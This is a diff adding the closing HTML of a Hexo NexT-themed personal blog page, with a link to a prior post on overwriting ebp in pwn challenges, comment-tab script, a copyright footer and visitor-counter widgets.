+                <a href="/2021/07/18/pwn-%E8%A6%86%E7%9B%96ebp/" rel="prev" title="pwn-覆盖ebp">
+                  <i class="fa fa-chevron-left"></i> pwn-覆盖ebp
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+      
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      const activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      const commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+    </div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+      
+
+      
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">mark0519</span>
+</div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div> <!--
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div> -->
+
+    </div>
+  </footer>
+
+  
+  <script src="//cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js"></script>
+<script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
